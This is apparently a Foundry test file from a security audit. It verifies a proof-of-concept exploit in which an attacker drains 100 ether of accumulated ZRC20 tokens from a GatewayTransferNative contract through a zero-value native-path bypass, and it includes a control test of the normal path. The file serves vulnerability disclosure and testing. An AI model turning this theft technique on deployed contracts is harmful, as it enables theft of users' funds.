// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./58579-h-2-any-attacker-will-steal-accumulated-zrc20-tokens-from-ga.sol";

contract DodoNativeBypassTest is Test {
    function test_exploit_stealWithZeroValue() public {
        Exploit e = new Exploit();
        e.run();

        assertEq(e.stolen(), 100 ether);
        assertEq(e.usdc().balanceOf(address(e.attackerRecv())), 100 ether);
        assertEq(e.usdc().balanceOf(address(e.gateway())), 0);
    }

    function test_control_nonNativeRequiresTransferFrom() public {
        Exploit e = new Exploit();
        // Cache addresses first — expectRevert applies to the *next* call only.
        GatewayTransferNative gw = e.gateway();
        address token = address(e.usdc());
        // Real ZRC20 path: without balance/allowance, transferFrom reverts "allow".
        vm.expectRevert(bytes("allow"));
        gw.withdrawToNativeChain(token, 1 ether, token, address(this));
    }
}
